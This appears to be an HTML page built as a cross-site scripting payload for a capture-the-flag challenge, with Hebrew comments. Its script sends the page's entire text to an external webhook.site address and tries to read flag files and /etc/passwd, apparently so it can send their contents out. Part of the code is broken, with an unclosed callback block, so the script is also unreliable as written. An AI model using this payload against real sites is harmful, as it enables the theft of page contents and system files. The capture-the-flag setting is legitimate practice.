<head><title>CTF XSS Flag Extractor</title></head>
<body>
  <h1>Flag Hunter</h1>
  <script>
    // 1. שולח את כל הטקסט שבדף ל-webhook
    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?content=' + encodeURIComponent(document.body.innerText));

    // 2. מנסה לקרוא דגל מכתובות נפוצות
    const paths = ['/flag', '/flag.txt', '/secret', '/secret.txt', '/etc/passwd'];
    paths.forEach(path => {
      fetch(path)
        .then(r => r.text())
        .then(data => {

        .catch(e => {});
    });

    // 3. הודעת אישור מקומית
    document.body.insertAdjacentHTML('beforeend', '<p style="color:green">✅ Flag script ran</p>');
  </script>
</body>
